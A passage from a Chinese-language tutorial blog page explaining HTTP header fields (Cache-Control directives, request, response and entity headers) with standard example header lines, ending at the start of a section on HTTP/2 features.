no-cache</span><br></pre></td></tr></table></figure></p><p>缓存请求指令：</p><table><thead><tr><th>指令</th><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>no-cache</td><td>无</td><td>强制向源服务器再次验证</td></tr><tr><td>no-store</td><td>无</td><td>不缓存请求或响应的任何内容</td></tr><tr><td>max-age=[秒]</td><td>必需</td><td>响应的最大 Age 值</td></tr><tr><td>max-stale=[秒]</td><td>可省略</td><td>接收已过期的响应</td></tr><tr><td>min-fresh=[秒]</td><td>必需</td><td>期望在指定时间内的响应仍有效</td></tr><tr><td>no-transform</td><td>无</td><td>代理不可更改媒体类型</td></tr><tr><td>only-if-cached</td><td>无</td><td>从缓存获取资源</td></tr><tr><td>cache-extension</td><td>-</td><td>新指令标记</td></tr></tbody></table><p>缓存响应指令：</p><table><thead><tr><th>指令</th><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>public</td><td>无</td><td>可向任意方提供响应的缓存</td></tr><tr><td>private</td><td>可省略</td><td>仅向特定用户返回响应</td></tr><tr><td>no-cache</td><td>可省略</td><td>缓存前必须确认其有效性</td></tr><tr><td>no-store</td><td>无</td><td>不缓存请求或响应的任何内容</td></tr><tr><td>no-transform</td><td>无</td><td>代理不可更改媒体类型</td></tr><tr><td>must-revalidate</td><td>无</td><td>可缓存但必须向源服务器进行确认</td></tr><tr><td>proxy-revalidate</td><td>无</td><td>要求中间缓存服务器对缓存的响应有效性再进行确认</td></tr><tr><td>max-age=[秒]</td><td>必需</td><td>响应的最大 Age 值</td></tr><tr><td>s-macage=[秒]</td><td>必需</td><td>公共缓存服务器响应的最大 Age 值</td></tr><tr><td>cache-extension</td><td>-</td><td>新指令标记</td></tr></tbody></table><ul><li>public 指令<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cache-Control</span>: public</span><br></pre></td></tr></table></figure></li></ul><p>此指令表示其它用户也可利用缓存。</p><ul><li>private 指令<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cache-Control</span>: private</span><br></pre></td></tr></table></figure></li></ul><p>此指令表示响应只以特定的用户作为对象，与 public 的行为正好相反。</p><ul><li>no-cache 指令<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br></pre></td></tr></table></figure></li></ul><p>此指令的目的是为了防止从缓存中返回 <strong> 过期 </strong> 的资源。</p><ul><li>no-store 指令<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cache-Control</span>: no-store</span><br></pre></td></tr></table></figure></li></ul><p>此指令规定不能在本地存储请求或者响应的任何一部分。</p><blockquote><p>从字面意思上很容易把 no-cache 误解成为不缓存，实际它代表的是不缓存过期的资源，缓存会向源服务器进行有效期确认后处理资源，也许称为 do-not-serve-from-cache-without-revalidation 更合适。no-store 才是真正地不进行缓存，请注意它们的区别。</p></blockquote><ul><li>max-age 指令<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cache-Control</span>: maxage=604800（单位：秒）</span><br></pre></td></tr></table></figure></li></ul><p>当客户端发送的请求中包含 max-age 指令时，如果判定缓存资源的缓存时间数值比指定时间的数值更小，那么客户端就接收缓存的资源。当 max-age 值为 0，缓存服务器需要将请求转发给源服务器。</p><p>当服务器返回的响应中包含 max-age 指令时，缓存服务器将不对资源的有效性再作确认，它的数值代表了缓存的最长时间。如果同时存在 Expires 字段，会优选处理 max-age 指令，而忽略掉 Expires 字段。</p><ul><li>s-maxage 指令<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cache-Control</span>: s-maxage=604800（单位：秒）</span><br></pre></td></tr></table></figure></li></ul><p>它的作用和 max-age 指令相同，不同点有两个：</p><ol><li>此指令只适用于供多位用户使用的公共缓存服务器，对于向同一用户重复返回响应的服务器来说，这个指令是没有用的。</li><li>当使用此指令后，会直接忽略对 Expires、max-age 指令的处理。</li></ol><ul><li>min-fresh 指令<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cache-Control</span>: min-fresh=60（单位：秒）</span><br></pre></td></tr></table></figure></li></ul><p>此指令要求缓存服务器返回还未过指定时间的缓存资源。</p><ul><li>max-stale 指令<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cache-Control</span>: max-stale=3600（单位：秒）</span><br></pre></td></tr></table></figure></li></ul><p>此指令表示即使缓存资源过期也照常接收。如果未指定参数值，那么无论经过多久，客户端都会接收响应。如果指定了具体值，那么即使过期，只要没有超过 max-stale 指定的时间内，客户端依然会接收。</p><ul><li>only-if-cached 指令<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cache-Control</span>: only-if-cached</span><br></pre></td></tr></table></figure></li></ul><p>此指令表示客户端仅在缓存服务器本直缓存了目标资源的情况下，才会要求其返回。该指令不要求缓存服务器重新加载响应，也不会再次确认资源有效性。若缓存服务器无响应，则返回 504 Gateway Timeout。</p><ul><li>must-revalidate 指令<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cache-Control</span>: must-revalidate</span><br></pre></td></tr></table></figure></li></ul><p>此指令表示代理服务器会向源服务器再次验证即将返回的响应缓存目前是否仍然有效。若代理服务器无法从源服务器获取有效资源的话，应该给客户端返回 504 Gateway Timeout。使用此指令之后，max-stale 指令会被忽略。</p><ul><li>proxy-revalidate 指令<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cache-Control</span>: proxy-revalidate</span><br></pre></td></tr></table></figure></li></ul><p>此指令表示所有的缓存服务器在返回响应之前必须再次验证缓存的有效性。</p><ul><li>no-transform 指令<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cache-Control</span>: no-transform</span><br></pre></td></tr></table></figure></li></ul><p>此指令表示无论是在请求或者响应中，缓存都不能改变实体主体的缓存类型。</p><ul><li>Cache-Control 扩展</li></ul><p>cache-extension token<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cache-Control</span>: private, community="UCI"</span><br></pre></td></tr></table></figure></p><p>通过此标记，可以扩展 Cache-Control 的字段指令。如上例，就扩展了 community 这个指令。如果目标服务器不理解这个指令，就会直接忽略。</p><h3 id="二、connection"><a href="#二、connection" class="headerlink" title="二、connection"></a>二、connection</h3><p>connection 首部字段有两个作用：</p><ol><li><p>控制不再转发给代理的首部字段</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">connection</span>: 不再转发的首部字段名</span><br></pre></td></tr></table></figure></li><li><p>管理持久连接</p></li></ol><p>HTTP/1.1 默认都是持久连接的，客户端可以在持久连接上连续发送请求。当服务器明确想断开连接时，则指定首部字段值为 close：<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure></p><p>HTTP/1.1 之前的版本如果想维持持久连接，则需要明确指定字段值为 Keep-Alive：<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Connection</span>: Keep-Alive</span><br></pre></td></tr></table></figure></p><h3 id="三、Date"><a href="#三、Date" class="headerlink" title="三、Date"></a>三、Date</h3><p>首部字段 Date 表明创建 HTTP 报文的日期和时间。</p><h3 id="四、Pragma"><a href="#四、Pragma" class="headerlink" title="四、Pragma"></a>四、Pragma</h3><p>首部字段 Pragma 是 HTTP/1.1 之前版本的遗留字段，只用在客户端请求中。作用是要求所有的中间服务器不返回缓存资源。因此为了兼容 HTTP/1.1 之前的版本，在发送请求时会包含两个首部字段：<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br></pre></td></tr></table></figure></p><h3 id="五、Trailer"><a href="#五、Trailer" class="headerlink" title="五、Trailer"></a>五、Trailer</h3><p>首部字段 Traliler 事先说明了报文主体后记录了哪些首部和字段，主要是应用在分块传输编码时。</p><h3 id="六、Transfer-Encoding"><a href="#六、Transfer-Encoding" class="headerlink" title="六、Transfer-Encoding"></a>六、Transfer-Encoding</h3><p>首部字段 Transfer-Encoding 规定了传输报文主体时采用的编码方式，仅对分块传输编码有效。</p><h3 id="七、Upgrade"><a href="#七、Upgrade" class="headerlink" title="七、Upgrade"></a>七、Upgrade</h3><p>首部字段 Upgrade 用于检测 HTTP 协议及其它协议是否可用更高的版本进行通信，其参数可以用来指定一个完全不同的通信协议。</p><h3 id="八、Via"><a href="#八、Via" class="headerlink" title="八、Via"></a>八、Via</h3><p>首部字段 Via 是为了追踪客户端与服务器之间的请求和响应报文的传输路径。报文经过代理或者网关时，会先在首部 Via 中附加服务器的信息，然后再进行转发。</p><h3 id="九、Warning"><a href="#九、Warning" class="headerlink" title="九、Warning"></a>九、Warning</h3><p>首部字段 Warning 通常会告知用户一些与缓存相关的问题警告。</p><h2 id="HTTP-请求头字段"><a href="#HTTP-请求头字段" class="headerlink" title="HTTP 请求头字段"></a>HTTP 请求头字段</h2><p>请求首部字段是从客户端往服务器发送请求报文中所使用的字段，用于补充请求的附加信息、客户端信息、对响应内容相关的优先级等内容。</p><h3 id="一、Accept"><a href="#一、Accept" class="headerlink" title="一、Accept"></a>一、Accept</h3><p>首部字段 Accept 通知服务器，用户代理能够处理的媒体类型及媒体类型的相对优先级。可使用 type/subtype 这种形式，一次指定多种媒体类型。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Accept</span>: text/plain; q=0.3, text/html</span><br></pre></td></tr></table></figure><p>使用 <code>q=</code> 来表示媒体类型的优先级，用分号进行分隔。权重 <code>q</code> 值的范围是 <code>0~1</code>（可精确到小数点后 3 位）。不指 <code>q</code> 值时，默认权重为 <code>q=1.0</code>。所以，浏览器会优先返回权重值最高的媒体类型。</p><h3 id="二、Accept-Charset"><a href="#二、Accept-Charset" class="headerlink" title="二、Accept-Charset"></a>二、Accept-Charset</h3><p>首部字段 Accept-Charset 用来告知服务器用户代理支持的字符集及字符集的优先顺序。可一次性指定多种字符集，使用权重 <code>q</code> 来表示相对优先级顺序。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Accept-Charset</span>: iso-8859-5, unicode-1-1; q=0.8</span><br></pre></td></tr></table></figure><h3 id="三、Accept-Encoding"><a href="#三、Accept-Encoding" class="headerlink" title="三、Accept-Encoding"></a>三、Accept-Encoding</h3><p>首部字段 Accept-Encoding 用来告知服务器用户代理支持的内容编码。可一次性指定多种，使用权重 <code>q</code> 表示相对优先级顺序。也可使用星号（*）作为通配符，指定任意的编码格式。常用的几种编码：gzip、compress、deflate、identity。</p><h3 id="四、Accept-Language"><a href="#四、Accept-Language" class="headerlink" title="四、Accept-Language"></a>四、Accept-Language</h3><p>首部字段 Accept-Language 用来告知服务器用户代理能够处理的自然语言集（指中文或英文等）。可指定多个自然语言集，使用权重 <code>q</code> 来表示相对优先级顺序。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Accept-Language</span>: zh-cn,zh; q=0.7, en-us,en; q=0.3</span><br></pre></td></tr></table></figure><h3 id="五、Authorization"><a href="#五、Authorization" class="headerlink" title="五、Authorization"></a>五、Authorization</h3><p>首部字段 Authorization 用来告知服务器用户代理的认证信息（证书值）。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Authorization</span>: Basic dWVub3NlbjpwYXNzd29yZA==</span><br></pre></td></tr></table></figure><h3 id="六、Expect"><a href="#六、Expect" class="headerlink" title="六、Expect"></a>六、Expect</h3><p>首部字段 Expect 用来告知服务器期望出现的某种特定行为。如果服务器无法理解发生错误时，应该返回状态码 417 Expectation Failed.</p><h3 id="七、From"><a href="#七、From" class="headerlink" title="七、From"></a>七、From</h3><p>首部字段 From 用来告知服务器使用用户代理的用户的电子邮件地址。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">From</span>: info@jd.com</span><br></pre></td></tr></table></figure></p><h3 id="八、Host"><a href="#八、Host" class="headerlink" title="八、Host"></a>八、Host</h3><p>首部字段 Host 告知服务器请求的资源所处的互联网主机名和端口号。它是 HTTP/1.1 规范内唯一一个必须被包含在请求内的首部字段。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Host</span>: www.jd.com</span><br></pre></td></tr></table></figure></p><h3 id="九、If-Match"><a href="#九、If-Match" class="headerlink" title="九、If-Match"></a>九、If-Match</h3><p>形如 If-Match 的请求首部字段，都可称为条件请求。只有当 If-Match 的字段值跟 Etag 值匹配一致时，服务器才会执行请求。如果指定星号（*）值，则服务器会忽略 Etag 值，只要资源存在就会处理请求。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">If-Match</span>: "123456"</span><br></pre></td></tr></table></figure></p><h3 id="十、If-Modified-Since"><a href="#十、If-Modified-Since" class="headerlink" title="十、If-Modified-Since"></a>十、If-Modified-Since</h3><p>它会告知服务器若 If-Modified-Since 的字段值早于资源的更新时间，则希望能处理此请求。否则，服务器应该返回状态码 304 Not Modified。一般用于确认代理或者客户端本地缓存资源的有效性。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">If-Modified-Since</span>: Thu, 15 Apr 2004 00:00:00 GMT</span><br></pre></td></tr></table></figure></p><h3 id="十一、If-None-Match"><a href="#十一、If-None-Match" class="headerlink" title="十一、If-None-Match"></a>十一、If-None-Match</h3><p>此首部字段用于告知服务器，当它的字段值与 Etag 不一致时，希望服务器处理该请求。</p><h3 id="十二、If-Range"><a href="#十二、If-Range" class="headerlink" title="十二、If-Range"></a>十二、If-Range</h3><p>此首部字段用于告知服务器，当它的字段值与请求资源的 Etag 值或时间相一致时，则作为范围请求处理。反之，则返回全体资源。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">If-Range</span>: "123456"</span><br></pre></td></tr></table></figure></p><h3 id="十三、If-Unmodified-Since"><a href="#十三、If-Unmodified-Since" class="headerlink" title="十三、If-Unmodified-Since"></a>十三、If-Unmodified-Since</h3><p>此首部字段用于告知服务器，指定的请求资源只有在字段值指定的日期之后，未发生更新的情况下，才能处理请求。否则，服务器应该返回状态码 412 Precondition Failed。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">If-Unmodified-Since</span>: Thu, 03 Jul 2012 00:00:00 GMT</span><br></pre></td></tr></table></figure></p><h3 id="十四、Max-Forwards"><a href="#十四、Max-Forwards" class="headerlink" title="十四、Max-Forwards"></a>十四、Max-Forwards</h3><p>通过 TRACE 方法或者 OPTIONS 方法，发送包含此首部字段的请求时，字段值以十进制整数形式指定可经过的服务器最大数目。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Max-Forwards</span>: 10</span><br></pre></td></tr></table></figure></p><h3 id="十五、Proxy-Authorization"><a href="#十五、Proxy-Authorization" class="headerlink" title="十五、Proxy-Authorization"></a>十五、Proxy-Authorization</h3><p>此首部字段用于告知代理服务器所需要的认证信息。这个认证只发生于客户端与代理服务器之间。客户端与服务器之间的认证需要使用首部字段 Authorization。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Proxy-Authorization</span>: Basic dGlwOjkpNLAGfFY5</span><br></pre></td></tr></table></figure></p><h3 id="十六、Range"><a href="#十六、Range" class="headerlink" title="十六、Range"></a>十六、Range</h3><p>此首部字段用于告知服务器获取部分资源的范围请求，例如以下示例就是获取从第 5001 字节至第 10000 字节的资源。服务器处理请求之后返回的状态码应该为 206 Partial Content。无法处理该请求时，应该返回状态码 200 OK 以及全部资源。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Range</span>: 5001-10000</span><br></pre></td></tr></table></figure></p><h3 id="十七、Referer"><a href="#十七、Referer" class="headerlink" title="十七、Referer"></a>十七、Referer</h3><p>此首部字段会告知服务器请求的原始资源 URI。但是，直接在浏览器地址栏输入 URI 或者出于安全考虑时，也可以不发送该首部字段。另外，Referer 的正确拼写应该是 Referrer，不知为何，这个错误一直延续至今。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: http://www.jd.com</span><br></pre></td></tr></table></figure></p><h3 id="十八、TE"><a href="#十八、TE" class="headerlink" title="十八、TE"></a>十八、TE</h3><p>此首部字段用于告知服务器客户端能够处理响应的传输编码方式及相对优先级。它和首部字段 Accept-Encoding 的功能很相似，但是用于传输编码。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">TE</span>: gzip, deflate;q=0.5</span><br></pre></td></tr></table></figure></p><h3 id="十九、User-Agent"><a href="#十九、User-Agent" class="headerlink" title="十九、User-Agent"></a>十九、User-Agent</h3><p>此首部字段会将创建请求的浏览器和用户代理名称等信息传达给服务器。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/⇒20100101 Firefox/13.0.1</span><br></pre></td></tr></table></figure></p><h2 id="HTTP-响应头字段"><a href="#HTTP-响应头字段" class="headerlink" title="HTTP 响应头字段"></a>HTTP 响应头字段</h2><p>响应首部字段是由服务器端向客户端返回响应报文中所使用的字段，用过补充响应的附加信息、服务器信息，以及对客户端的附加要求等信息。</p><h3 id="一、Accept-Ranges"><a href="#一、Accept-Ranges" class="headerlink" title="一、Accept-Ranges"></a>一、Accept-Ranges</h3><p>此首部字段用于告知客户端服务器是否能处理范围请求。如果能处理返回的值为 bytes，否则返回的值为 none。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Accept-Ranges</span>: bytes</span><br></pre></td></tr></table></figure></p><h3 id="二、Age"><a href="#二、Age" class="headerlink" title="二、Age"></a>二、Age</h3><p>此首部字段用于告知客户端，服务器在多久前创建了响应，单位为秒。若是缓存服务器，则是指缓存后的响应再次发起认证到认证完成的时间值。代理创建响应时必须带上此首部字段。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Age</span>: 600</span><br></pre></td></tr></table></figure></p><h3 id="三、ETag"><a href="#三、ETag" class="headerlink" title="三、ETag"></a>三、ETag</h3><p>它是一种可将资源以字符串形式做唯一标识的方式。服务器会为每份资源分配对应的 ETag 值。资源更新时，ETag 值也会更新。生成 ETag 值的算法由服务器决定。ETag 值分为两种：</p><ul><li>强 ETag 值</li></ul><p>不认实体发生多么细微的变化都会改变其值。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ETag</span>: "usagi-1234"</span><br></pre></td></tr></table></figure></p><ul><li>弱 ETag 值</li></ul><p>只用于提示资源是否相同，只有资源发生了根本改变，产生差异时才会改变 ETag 值，而且在字符值最开始处附加 W/。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ETag</span>: W/"usagi-1234"</span><br></pre></td></tr></table></figure></p><h3 id="四、Location"><a href="#四、Location" class="headerlink" title="四、Location"></a>四、Location</h3><p>几乎所有的浏览器在接收到包含首部字段 Location 的响应后，都会强制性地尝试进行资源重定向。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Location</span>: http://www.jd.com</span><br></pre></td></tr></table></figure></p><h3 id="五、Proxy-Authenticate"><a href="#五、Proxy-Authenticate" class="headerlink" title="五、Proxy-Authenticate"></a>五、Proxy-Authenticate</h3><p>把由代理服务器所要求的认证信息发送给客户端。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Proxy-Authenticate</span>: Basic realm="Usagidesign Auth"</span><br></pre></td></tr></table></figure></p><h3 id="六、Retry-After"><a href="#六、Retry-After" class="headerlink" title="六、Retry-After"></a>六、Retry-After</h3><p>此首部字段告知客户端应该在多久之后再次发送请求。主要是配合状态码 503 Service Unavailable 或者 3xx Redirect。可以指定具体的时间值，也可以是创建响应后的秒数。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Retry-After</span>: 120</span><br></pre></td></tr></table></figure></p><h3 id="七、Server"><a href="#七、Server" class="headerlink" title="七、Server"></a>七、Server</h3><p>此首部字段告知客户端当前服务器上安装的 HTTP 服务器应用程序的信息。不仅仅有应用程序的名称，还有可能包括版本号和安装时启用的可选项。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Server</span>: Apache/2.2.17 (Unix)</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.2.6 (Unix) PHP/5.2.5</span><br></pre></td></tr></table></figure></p><h3 id="八、Vary"><a href="#八、Vary" class="headerlink" title="八、Vary"></a>八、Vary</h3><p>此首部字段可对缓存进行控制。从代理服务器收到源服务器返回包含 Vary 的响应之后，若要再进行缓存，仅对请求中含有相同 Vary 字段值的请求返回缓存。即使请求相同的资源，但是 Vary 指定的首部字段值不相同，也要必须从源服务器重新获取资源。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Vary</span>: Accept-Language</span><br></pre></td></tr></table></figure></p><h3 id="九、WWW-Authenticate"><a href="#九、WWW-Authenticate" class="headerlink" title="九、WWW-Authenticate"></a>九、WWW-Authenticate</h3><p>此首部字段用于 HTTP 访问认证。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">WWW-Authenticate</span>: Basic realm="Usagidesign Auth"</span><br></pre></td></tr></table></figure></p><h2 id="HTTP-实体头字段"><a href="#HTTP-实体头字段" class="headerlink" title="HTTP 实体头字段"></a>HTTP 实体头字段</h2><p>实体首部字体是包含在请求报文和响应报文中的实体部分所使用的首部，用于补充内容的更新时间等与实体相关的信息。</p><h3 id="一、Allow"><a href="#一、Allow" class="headerlink" title="一、Allow"></a>一、Allow</h3><p>此首部字段用于告知客户端能够支持 Request-URI 指定资源的 HTTP 方法。当服务器收到不支持的 HTTP 方法时，会返回状态码 405 Method Not Allowed，并且还会把所有支持的 HTTP 方法写入首部字段 Allow 后返回。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Allow</span>: GET, HEAD</span><br></pre></td></tr></table></figure></p><h3 id="二、Content-Encoding"><a href="#二、Content-Encoding" class="headerlink" title="二、Content-Encoding"></a>二、Content-Encoding</h3><p>此首部字段用于告知客户端服务器对实体的主体部分选用的内容编码方式。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Encoding</span>: gzip</span><br></pre></td></tr></table></figure></p><h3 id="三、Content-Language"><a href="#三、Content-Language" class="headerlink" title="三、Content-Language"></a>三、Content-Language</h3><p>此首部字体用于告知客户端，实体主体使用的自然语言（指中文或者英文等）。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Language</span>: zh-CN</span><br></pre></td></tr></table></figure></p><h3 id="四、Content-Length"><a href="#四、Content-Length" class="headerlink" title="四、Content-Length"></a>四、Content-Length</h3><p>此首部字段表明了实体主体部分的大小（单位是字节）。对实体主体进行内容编码传输时，不能再使用 Content-Length 首部字段。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Length</span>: 15000</span><br></pre></td></tr></table></figure></p><h3 id="五、Content-Location"><a href="#五、Content-Location" class="headerlink" title="五、Content-Location"></a>五、Content-Location</h3><p>此首部字段表示的是报文主体返回资源对应的 URI。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Location</span>: http://www.jd.com/index.html</span><br></pre></td></tr></table></figure></p><h3 id="六、Content-MD5"><a href="#六、Content-MD5" class="headerlink" title="六、Content-MD5"></a>六、Content-MD5</h3><p>此首部字段是一串由 MD5 算法生成的值，其目的在于检查报文主体在传输过程中是否保持完整。客户端会对接收的报文主体执行相同的 MD5 算法，然后与此首部字段值进行比较。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-MD5</span>: OGFkZDUwNGVhNGY3N2MxMDIwZmQ4NTBmY2IyTY==</span><br></pre></td></tr></table></figure></p><h3 id="七、Content-Range"><a href="#七、Content-Range" class="headerlink" title="七、Content-Range"></a>七、Content-Range</h3><p>作为返回响应时使用此首部字段，能告知客户端返回的实体的哪个部分符合范围请求。字段值以字节为单位。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Range</span>: bytes 5001-10000/10000</span><br></pre></td></tr></table></figure></p><h3 id="八、Content-Type"><a href="#八、Content-Type" class="headerlink" title="八、Content-Type"></a>八、Content-Type</h3><p>此首部字段说明了实体主体内对象的媒体类型。字段值用 type/subtype 形式赋值。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure></p><h3 id="九、Expires"><a href="#九、Expires" class="headerlink" title="九、Expires"></a>九、Expires</h3><p>此首部字段用于告知客户端缓存资源失效的日期。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Expires</span>: Wed, 04 Jul 2012 08:26:05 GMT</span><br></pre></td></tr></table></figure></p><h3 id="十、Last-Modified"><a href="#十、Last-Modified" class="headerlink" title="十、Last-Modified"></a>十、Last-Modified</h3><p>此首部字段用来指明资源的最后修改时间。<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Last-Modified</span>: Wed, 23 May 2012 09:59:55 GMT</span><br></pre></td></tr></table></figure></p><h1 id="HTTP-请求过程"><a href="#HTTP-请求过程" class="headerlink" title="HTTP 请求过程"></a>HTTP 请求过程</h1><ol><li>域名解析</li><li>与目标 IP 建立起基于 TCP 的 HTTP 连接</li><li>传输请求数据</li><li>服务器收到请求数据</li><li>服务器执行对应的 CGI 程序进行处理</li><li>服务器把处理结果通过之前建立起来的 HTTP 连接响应给客户端</li><li>客户端将响应结果处理后渲染给用户，同时服务器关闭与客户端建立的连接</li></ol><h1 id="HTTP-2-0-的特性"><a href="#HTTP-2-0-的特性" class="headerlink" title="HTTP 2.0 的特性"></a>HTTP 2.0 的特性</h1><h2 id="一、HTTP-2-0：改进传输性能"><a href="#一、HTTP-2-0：改进传输性能" class="headerlink" title="一、HTTP 2.0：改进传输性能"></a>一、HTTP 2.0：改进传输性能</h2><blockquote><p>HTTP 2.0 的主要目标是改进传输性能，实现低延迟和高吞吐量。从另一方面看，HTTP 的高层协议语义并不会因为这次版本升级而受影响。所有 HTTP 首部、值，以及它们的使用场景都不会变。</p></blockquote><p><strong> 现有的任何网站和应用，无需做任何修改都可以在 HTTP 2.0 上跑起来。不用为了利用 HTTP 2.0 的好处而修改标记。HTTP 服务器必须运行 HTTP 2.0 协议，但大部分用户都不会因此而受到影响。</strong></p><h2 id="二、HTTP2-0-历史及其与-SPDY-的渊源"><a href="#二、HTTP2-0-历史及其与-SPDY-的渊源" class="headerlink" title="二、HTTP2.0 历史及其与 SPDY 的渊源"></a>二、HTTP2.0 